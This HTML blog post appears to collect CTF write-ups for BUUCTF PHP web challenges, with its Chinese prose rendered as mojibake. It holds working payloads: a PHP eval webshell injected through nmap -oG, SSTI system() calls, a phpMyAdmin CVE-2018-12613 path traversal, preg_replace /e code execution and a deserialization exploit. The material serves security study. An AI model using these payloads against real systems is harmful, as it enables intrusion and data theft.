<h2 id="htaccessé…ç½®æ–‡ä»¶"><a href="#htaccessé…ç½®æ–‡ä»¶" class="headerlink" title=".htaccessé…ç½®æ–‡ä»¶"></a>.htaccessé…ç½®æ–‡ä»¶</h2><p>ä¸Šä¼ .htaccessé…ç½®æ–‡ä»¶ï¼Œå°†ç›®å½•ä¸‹çš„jpgæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ</p>
<p><img src="/2021/10/21/BUU/BabyUpload-3.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿æ¥èšå‰‘ï¼Œæ ¹ç›®å½•ä¸‹æ‹¿flag</p>
<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>javaâ€¦å…ˆæ”¾ä¸€æ”¾</p>
<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><div class="hljs code-wrapper"><pre><code>&lt;?php

    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;
        $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
    &#125;

    if(!isset($_GET[&#39;host&#39;])) &#123;
        highlight_file(__FILE__);
    &#125; else &#123;
        $host = $_GET[&#39;host&#39;];

        //escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“
        $host = escapeshellarg($host);
        $host = escapeshellcmd($host);
        
        //åˆ›å»ºsandbox å¹¶ä½¿ç”¨ç›®å½•
        $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);
        echo &#39;you are in sandbox &#39;.$sandbox;
        @mkdir($sandbox);
        chdir($sandbox);

        //åˆ©ç”¨ç‚¹
        echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
    &#125;
</code></pre></div>
<p>è¿™é‡Œä»£ç çš„æœ¬æ„æ˜¯å¸Œæœ›æˆ‘ä»¬è¾“å…¥ipè¿™æ ·çš„å‚æ•°åšä¸€ä¸ªæ‰«æï¼Œé€šè¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°æ¥è¿›è¡Œè§„åˆ™è¿‡æ»¤è½¬è¯‘ï¼Œæˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«å•å¼•å·å¼•èµ·æ¥ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬çœ‹åˆ°äº†ä¸Šé¢çš„æ¼æ´æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€ƒè„±è¿™ä¸ªå¼•å·çš„æŸç¼š</p>
<p>nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p>
<p>æ„é€ payload</p>
<div class="hljs code-wrapper"><pre><code>&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;

escapeshellarg---&gt;å…ˆå°†&#39;è½¬ä¹‰ï¼Œç„¶åè¿›è¡Œå‰ååˆ†æ®µ&#39;é—­åˆ
&#39;&#39;\&#39;&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;\&#39;&#39;&#39;

escapeshellcmd---&gt;å…ˆå°†\ç­‰å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åå¯¹ä¸é…å¯¹çš„&#39;è¿›è¡Œè½¬ä¹‰
&#39;&#39;\\&#39;&#39;\&lt;\?php eval\(\$_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;
</code></pre></div>
<p>æ„é€ payloadï¼Œç»™æ²™ç›’åœ°å€ï¼Œè¿èšå‰‘ï¼Œget flag</p>
<h3 id="ç»†èŠ‚å¤„ç†"><a href="#ç»†èŠ‚å¤„ç†" class="headerlink" title="ç»†èŠ‚å¤„ç†"></a>ç»†èŠ‚å¤„ç†</h3><p><img src="/2021/10/21/BUU/Online-Tool-1.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“"><a href="#escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“" class="headerlink" title="escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“"></a>escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“</h2><p><a href="https://opn90.top/2021/10/27/PHP-ways/#escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93">å‚è€ƒï¼šhttps://opn90.top/2021/10/27/PHP-ways/#escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93</a></p>
<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>è¿›å…¥ç•Œé¢æ˜¾ç¤ºæœ¬åœ°IPåœ°å€</p>
<p>æŠ“åŒ…ï¼Œå‘X-Forwarded-Forï¼Œæ”¹å˜æ˜¾ç¤º</p>
<p>å°è¯•sqlæ³¨å…¥ï¼Œæ— æœ(downäº†)</p>
<p>å°è¯•sstiæ¨¡æ¿æ³¨å…¥ï¼Œæœ‰å›æ˜¾ï¼Œä¸”æ— è¿‡æ»¤</p>
<p>payload:</p>
<div class="hljs code-wrapper"><pre><code>&#123;&#123;system('ls')&#125;&#125;

&#123;&#123;system('ls /')&#125;&#125;

//get flag
&#123;&#123;system('cat /flag')&#125;&#125;
</code></pre></div>
<p>â€¦çŸ¥è¯†é¢è¿˜æ˜¯ä¸å¤Ÿå¹¿ï¼Œå®¹æ˜“å®•æœºâ€¦</p>
<h1 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1><h2 id="gitæ–‡ä»¶æ³„éœ²"><a href="#gitæ–‡ä»¶æ³„éœ²" class="headerlink" title=".gitæ–‡ä»¶æ³„éœ²"></a>.gitæ–‡ä»¶æ³„éœ²</h2><p>ç”¨GitHack downä¸‹æ‰€æ³„éœ²çš„æ–‡ä»¶</p>
<div class="hljs code-wrapper"><pre><code>&lt;?php
include &quot;flag.php&quot;;
echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;
if(isset($_GET[&#39;exp&#39;]))&#123;
    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;
        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;
            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;
                // echo $_GET[&#39;exp&#39;];
                @eval($_GET[&#39;exp&#39;]);
            &#125;
            else&#123;
                die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);
            &#125;
        &#125;
        else&#123;
            die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);
        &#125;
    &#125;
    else&#123;
        die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);
    &#125;
&#125;
// highlight_file(__FILE__);
?&gt;
</code></pre></div>
<p>åˆ†ææºç </p>
<p>1.banäº†dataã€filterã€phpã€pharå¸¸ç”¨ä¼ªåè®®<br>2.å¾ˆç»å…¸çš„æ­£åˆ™åŒ¹é…æ— å‚æ•°RCEï¼Œ(?R)?è¡¨ç¤ºçš„æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚æœ‰æ•ˆçš„payloadå½¢å¼æ˜¯ä»¤å‡½æ•°ä½œä¸ºå‚æ•° å¥—å¨ƒï¼ša(b())<br>ä¼ å…¥çš„å‚æ•°åªèƒ½åŒ…æ‹¬å°å†™å­—æ¯ã€ä¸‹åˆ’çº¿ã€é€—å·ã€æ‹¬å·ï¼Œè¿˜è¦ä»¥;ç»“å°¾<br>3.banæ‰äº†ä¸€äº›å…³é”®å­—</p>
<h2 id="æ— å‚æ•°RCE"><a href="#æ— å‚æ•°RCE" class="headerlink" title="æ— å‚æ•°RCE"></a>æ— å‚æ•°RCE</h2><p>1.å…ˆè¯»å–ç›®å½•</p>
<div class="hljs code-wrapper"><pre><code>//è¯»å–å½“å‰ç›®å½•---&gt;flag.php index.php 
print_r(scandir(pos(localeconv())));
</code></pre></div>
<p>2.è¯»æ–‡ä»¶</p>
<div class="hljs code-wrapper"><pre><code>//
show_source(next(array_reverse(scandir(pos(localeconv())))));
</code></pre></div>
<h2 id="å…¶ä»–è§£æ³•ï¼ˆsession-id-å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼‰"><a href="#å…¶ä»–è§£æ³•ï¼ˆsession-id-å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼‰" class="headerlink" title="å…¶ä»–è§£æ³•ï¼ˆsession_id()å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼‰"></a>å…¶ä»–è§£æ³•ï¼ˆsession_id()å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼‰</h2><p>â€¦(æ²¡å®Œå…¨çœ‹æ‡‚ï¼Œå°±ä¸å†™äº†)</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/12868440.html">https://www.cnblogs.com/LLeaves/p/12868440.html</a></p>
<h1 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1><p>é´æˆæ¹æ¶“â‚¬æ¶“î…æšŸé¹î†¼ç°±é”›å±¼çµ¾é–²å²„æ½°æµ â‚¬æ¶”å œç¯ƒå¨Œâ„ƒæ¹~<br>æ¶“å¶„ä¿Šæµ£çŠ³å£˜</p>
<p>â€¦</p>
<p>â€”&gt;robots.txtâ€”&gt;Disallow: phpinfo.phpâ€”&gt;ä¸ä¼šåˆ†æ down </p>
<p>â€”&gt;æ‰«ä¸€ä¸‹â€”&gt;phpmyadminâ€¦</p>
<p>â€¦</p>
<h2 id="CVE-2018-12613-phpMyadmin-CVE-2018-12613-åå°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#CVE-2018-12613-phpMyadmin-CVE-2018-12613-åå°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="CVE-2018-12613 phpMyadmin(CVE-2018-12613)åå°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´"></a>CVE-2018-12613 phpMyadmin(CVE-2018-12613)åå°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</h2><p><a target="_blank" rel="noopener" href="https://www.xiinnn.com/article/e7c68814.html">https://www.xiinnn.com/article/e7c68814.html</a></p>
<p>payload:</p>
<div class="hljs code-wrapper"><pre><code>//æŠ„ä½œä¸š
phpmyadmin/?target=db_sql.php%253f/../../../../../../../../flag
</code></pre></div>
<h1 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h1><div class="hljs code-wrapper"><pre><code>&lt;?php

error_reporting(0);
$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;))&#123;
    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
    if(preg_match(&quot;/flag/&quot;,$file))&#123;
        die(&quot;Not now!&quot;);
    &#125;

    include($file);  //next.php

&#125;
else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;
</code></pre></div>
<p>å®¡è®¡æºç </p>
<p>ä¼ªåè®®ç»•è¿‡</p>
<div class="hljs code-wrapper"><pre><code>/?text=data://text/plain,I+have+a+dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php
</code></pre></div>
<p>è¯»å‡ºnext.php</p>
<div class="hljs code-wrapper"><pre><code>&lt;?php
$id = $_GET[&#39;id&#39;];
$_SESSION[&#39;id&#39;] = $id;

function complex($re, $str) &#123;
    return preg_replace(
        &#39;/(&#39; . $re . &#39;)/ei&#39;,
        &#39;strtolower(&quot;\\1&quot;)&#39;,
        $str
    );
&#125;


foreach($_GET as $re =&gt; $str) &#123;//$reå‚æ•°çš„keyï¼Œ$strå°±æ˜¯å‚æ•°çš„value
    echo complex($re, $str). &quot;\n&quot;;
&#125;

function getFlag()&#123;
    @eval($_GET[&#39;cmd&#39;]);
&#125;
</code></pre></div>
<h2 id="preg-replace-e-æ¨¡å¼ä¸‹çš„ä»£ç æ¼æ´é—®é¢˜"><a href="#preg-replace-e-æ¨¡å¼ä¸‹çš„ä»£ç æ¼æ´é—®é¢˜" class="headerlink" title="preg_replace() /e æ¨¡å¼ä¸‹çš„ä»£ç æ¼æ´é—®é¢˜"></a>preg_replace() /e æ¨¡å¼ä¸‹çš„ä»£ç æ¼æ´é—®é¢˜</h2><p><a target="_blank" rel="noopener" href="http://www.xinyueseo.com/websecurity/158.html">é™„ä¸Šåšå®¢ï¼šhttp://www.xinyueseo.com/websecurity/158.html</a><br><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/">é™„ä¸Šåšå®¢ï¼šhttp://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">é™„ä¸Šåšå®¢ï¼šhttps://xz.aliyun.com/t/2557</a></p>
<p>preg_replace()å‡½æ•°æœ€åä»¥/eç»“å°¾æ—¶ï¼Œä¼šå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæœ‰/eï¼Œå¹¶ä¸”åŒ¹é…åˆ°ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å°†è¢«å½“åšä»£ç æ¥æ‰§è¡Œ</p>
<p>php5.5.0 å/e ä¿®é¥°ç¬¦å·²ç»è¢«å¼ƒç”¨äº†</p>
<h2 id="æ­£åˆ™åŒ¹é…çš„-åå‘å¼•ç”¨"><a href="#æ­£åˆ™åŒ¹é…çš„-åå‘å¼•ç”¨" class="headerlink" title="æ­£åˆ™åŒ¹é…çš„ åå‘å¼•ç”¨"></a>æ­£åˆ™åŒ¹é…çš„ åå‘å¼•ç”¨</h2><p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼,ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·,å°†å¯¼è‡´ç›¸å…³åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°  </p>
<h2 id="strtolower-â€œ-1â€"><a href="#strtolower-â€œ-1â€" class="headerlink" title="strtolower(â€œ\1â€)"></a>strtolower(â€œ\1â€)</h2><p>æ‰€ä»¥è¿™é‡Œçš„ 1 å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹</p>
<p><a target="_blank" rel="noopener" href="http://www.xinyueseo.com/websecurity/158.html">é™„ä¸Šåšå®¢ï¼šhttp://www.xinyueseo.com/websecurity/158.html</a><br><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/">é™„ä¸Šåšå®¢ï¼šhttp://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">é™„ä¸Šåšå®¢ï¼šhttps://xz.aliyun.com/t/2557</a></p>
<h2 id="PHP-å½“éæ³•å­—ç¬¦ä¸ºé¦–å­—æ¯æ—¶ï¼Œåªæœ‰ç‚¹å·ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿"><a href="#PHP-å½“éæ³•å­—ç¬¦ä¸ºé¦–å­—æ¯æ—¶ï¼Œåªæœ‰ç‚¹å·ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿" class="headerlink" title="PHP:å½“éæ³•å­—ç¬¦ä¸ºé¦–å­—æ¯æ—¶ï¼Œåªæœ‰ç‚¹å·ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿"></a>PHP:å½“éæ³•å­—ç¬¦ä¸ºé¦–å­—æ¯æ—¶ï¼Œåªæœ‰ç‚¹å·ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿</h2><p><img src="/2021/10/21/BUU/ZJCTF-1.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™é‡Œè§£é‡Šä¸‹ç”¨\S*è€Œä¸æ˜¯ç”¨.*çš„åŸå› ï¼š<br>å› ä¸ºåœ¨phpä¸­ï¼Œå¯¹äºä¼ å…¥éæ³•çš„$_GETå‚æ•°åï¼Œä¼šå°†å…¶è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œå¯¼è‡´æ­£åˆ™åŒ¹é…å¤±æ•ˆ<br>æ‰€ä»¥æˆ‘ä»¬åªèƒ½ä½¿ç”¨\S*æˆ–è€…\S%2bæ¥è¿›è¡Œæ„é€ payload</p>
<p>payload </p>
<div class="hljs code-wrapper"><pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);
</code></pre></div>
<h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h1><p>index.php å­˜åœ¨phpæŠ¥é”™</p>
<p>åˆ†ææºç ï¼ŒæŠ“åŒ…</p>
<div class="hljs code-wrapper"><pre><code>func=&amp;p=
</code></pre></div>
<p>è·å–ä¸¤ä¸ªä¸Šä¼ å˜é‡ï¼ŒçŒœæµ‹åç«¯è¯­å¥</p>
<div class="hljs code-wrapper"><pre><code>$func($p);
</code></pre></div>
<p>å°è¯•ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå›æ˜¾hackerâ€¦ï¼Œå°è¯•æ‰§è¡Œå…¶ä»–å‡½æ•°ï¼Œè¯»æ–‡ä»¶è·å–ç›¸å…³ä¿¡æ¯ï¼ŒæŠ¥é”™</p>
<div class="hljs code-wrapper"><pre><code>call_user_func() expects parameter 1 to be a valid callback, function &#39;xxx&#39; not found or invalid function name in /var/www/html/index.php on line 24
</code></pre></div>
<p>æ›´æ–°çŒœæµ‹</p>
<div class="hljs code-wrapper"><pre><code>call_user_func($func,$p);
</code></pre></div>
<p>è¯»å–æºç </p>
<div class="hljs code-wrapper"><pre><code>func=file_get_contents&amp;p=index.php
</code></pre></div>
<p>éƒ¨åˆ†æºç </p>
<div class="hljs code-wrapper"><pre><code>$disable_fun=&#123;...&#125;

 function gettime($func, $p) &#123;
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == &quot;string&quot;) &#123;
        return $result;
    &#125; else &#123;return &quot;&quot;;&#125;
&#125;

class Test &#123;
    var $p = &quot;Y-m-d h:i:s a&quot;;
    var $func = &quot;date&quot;;
    function __destruct() &#123;
        if ($this-&gt;func != &quot;&quot;) &#123;
            echo gettime($this-&gt;func, $this-&gt;p);
        &#125;
    &#125;
&#125;

$func = $_REQUEST[&quot;func&quot;];
$p = $_REQUEST[&quot;p&quot;];

if ($func != null) &#123;
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) &#123;
        echo gettime($func, $p);
    &#125;else &#123;
        die(&quot;Hacker...&quot;);
    &#125;
&#125;
</code></pre></div>
<p>å°è¯•å¯»æ‰¾å‡½æ•°ç»•è¿‡â€¦ban çš„æœ‰ç‚¹å¤š<br>å‘ç°(æ— ç”¨)ç±»Testï¼Œæ²¡æœ‰ban serializeï¼Œå…¶é”€æ¯æ–¹æ³•ä¹Ÿè°ƒç”¨äº†æ‰§è¡Œå‡½æ•°ï¼Œå°è¯•ååºåˆ—åŒ–</p>
<p>exp </p>
<div class="hljs code-wrapper"><pre><code>&lt;?php
class Test &#123;
    var $p = &quot;ls /&quot;;
    var $func = &quot;system&quot;;
&#125;

$a= new Test();
print_r(serialize($a));
</code></pre></div>
<p>find / -name flag*<br>æ‰¾åˆ°ä¸€å †â€¦ </p>
<p>åœ¨/tmp/flagoefiu4r93ä¸­..</p>
<p>payload</p>
<div class="hljs code-wrapper"><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
</code></pre></div>
<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p><img src="/2021/10/21/BUU/phpweb-1.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h1><div class="hljs code-wrapper"><pre><code>/www.tar.gz
ä¸‹è½½æºç 
</code></pre></div>
<p>ç”¨Dç›¾æ‰«å‡ºäº†ä¸€å †â€¦</p>
<p><img src="/2021/10/21/BUU/goodhacker-1.png" srcset="/img/loading.gif" lazyload></p>
<p>å†™è„šæœ¬éå†å±é™©å‡½æ•°ï¼Œæµ‹è¯•å¯ç”¨æ€§ï¼Œç¡®å®šåˆ©ç”¨ç‚¹</p>
<div class="hljs code-wrapper"><pre><code>import os
import re
import requests
import threading

dirr = &#39;&#39;
files = os.listdir(dirr)                                # è·å–æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶
reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)            # è®¾ç½®æ­£åˆ™åŒ¹é…

def thread1():
    for i in files:  # å¾ªç¯æ–‡ä»¶
        print(&quot;----------------------&quot;, i)
        url = &quot;&quot;  # url (dockeré€‚é…çš„phpç‰ˆæœ¬)
        f = open(dirr + i)  # æ‰“å¼€è¿™ä¸ªæ–‡ä»¶
        data = f.read()  # è¯»å–æ–‡ä»¶å†…å®¹
        f.close()  # å…³é—­æ–‡ä»¶

        result = reg.findall(data)  # ä»æ–‡ä»¶å†…å®¹ä¸­æ‰¾åˆ°GETè¯·æ±‚

        for j in result:  # å¾ªç¯GETå‚æ•°
            payload = url + i + &quot;?&quot; + j + &quot;=echo+123456&quot;  # å°è¯•è¯·æ±‚æ¬¡è·¯å¾„ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤
            print(payload)
            html = requests.get(payload)
            if &quot;123456&quot; in html.text:
                print(&quot;*****************************&quot;, payload)
                exit(1)

p1 = threading.Thread(target=thread1())
p1.start()
</code></pre></div>
<p>å°è¯•å¤šè¿›ç¨‹åŠ é€Ÿ<br>æœ‰äº¿ç‚¹ä¸‘ï¼Œä½†æœ‰æ•ˆ<br>ç¼–ç èƒ½åŠ›è¿˜éœ€è¦æ”¹è¿›   </p>
<div class="hljs code-wrapper"><pre><code>import os
import re
import time
import requests
import threading

dirr = &#39;&#39;
files1 = os.listdir(dirr)                               # è·å–æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶
files2 = os.listdir(dirr)                               # è·å–æ–‡ä»¶å¤¹ä¸‹çš„ååºæ–‡ä»¶
files2.sort()
files2.reverse()
reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)            # è®¾ç½®æ­£åˆ™åŒ¹é…


def thread1(files, a):
    for i in files:                                     # å¾ªç¯æ–‡ä»¶
        if a == 1:
            print(&quot;1111111----------------------&quot;, i)
        elif a == 2:
            print(&quot;2222222----------------------&quot;, i)
        url = &quot;&quot;             # url (dockeré€‚é…çš„phpç‰ˆæœ¬)
        f1 = open(dirr + i)                             # æ‰“å¼€è¿™ä¸ªæ–‡ä»¶
        data = f1.read()                                # è¯»å–æ–‡ä»¶å†…å®¹
        f1.close()                                      # å…³é—­æ–‡ä»¶

        result = reg.findall(data)                      # ä»æ–‡ä»¶å†…å®¹ä¸­æ‰¾åˆ°GETè¯·æ±‚

        for j in result:                                # å¾ªç¯GETå‚æ•°
            payload = url + i + &quot;?&quot; + j + &quot;=echo+123456&quot;  # å°è¯•è¯·æ±‚æ¬¡è·¯å¾„ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤
            print(payload)
            html = requests.get(payload)
            if &quot;123456&quot; in html.text:
                print(&quot;*****************************&quot;, payload)
                exit(1)


p1 = threading.Thread(target=thread1, args=(files1, 1))
p2 = threading.Thread(target=thread1, args=(files2, 2))
p1.start()
p2.start()
</code></pre></div>
<p>payload </p>
<div class="hljs code-wrapper"><pre><code>/xk0SzyKwfzw.php?Efa5BVG=cat+/flag
</code></pre></div>
<h2 id="python-ä¸å¯å˜å¯¹è±¡"><a href="#python-ä¸å¯å˜å¯¹è±¡" class="headerlink" title="python ä¸å¯å˜å¯¹è±¡"></a>python ä¸å¯å˜å¯¹è±¡</h2><p>å¯å˜å¯¹è±¡â€“å­—å…¸ï¼Œé›†åˆï¼Œåˆ—è¡¨</p>
<p>å…±ç”¨ä¸€ä¸ªåœ°å€</p>
<p>ä¸å¯å˜å¯¹è±¡â€“æ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå…ƒç»„ï¼Œä¸å¯å˜é›†åˆ</p>
<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>(ä¸€ä¸ªåšçš„å¾ˆä¸é”™çš„å‰ç«¯)</p>
<p>å‘ç°   ?message=   å’Œç•Œé¢æœ€åçš„  dog</p>
<p>å®¡è®¡æºç ï¼Œå°è¯•sqlã€sstiï¼Œæ— æœ</p>
<h2 id="gitæ–‡ä»¶æ³„éœ²-1"><a href="#gitæ–‡ä»¶æ³„éœ²-1" class="headerlink" title=".gitæ–‡ä»¶æ³„éœ²"></a>.gitæ–‡ä»¶æ³„éœ²</h2><p>GitHack    </p>
<p>down ä¸ä¸‹index.php å’Œ flag.phpâ€¦(ä¸çŸ¥é“ä¸ºå•¥..è¿˜é‡è£…äº†ä¸¤é)</p>
<h2 id="exit-è¾“å‡ºä¸€æ¡æ¶ˆæ¯å¹¶é€€å‡ºå½“å‰è„šæœ¬"><a href="#exit-è¾“å‡ºä¸€æ¡æ¶ˆæ¯å¹¶é€€å‡ºå½“å‰è„šæœ¬" class="headerlink" title="exit($) è¾“å‡ºä¸€æ¡æ¶ˆæ¯å¹¶é€€å‡ºå½“å‰è„šæœ¬"></a>exit($) è¾“å‡ºä¸€æ¡æ¶ˆæ¯å¹¶é€€å‡ºå½“å‰è„šæœ¬</h2><h2 id="php-å˜é‡è¦†ç›–"><a href="#php-å˜é‡è¦†ç›–" class="headerlink" title="php å˜é‡è¦†ç›–"></a>php å˜é‡è¦†ç›–</h2><p>â€”&gt; index.php</p>
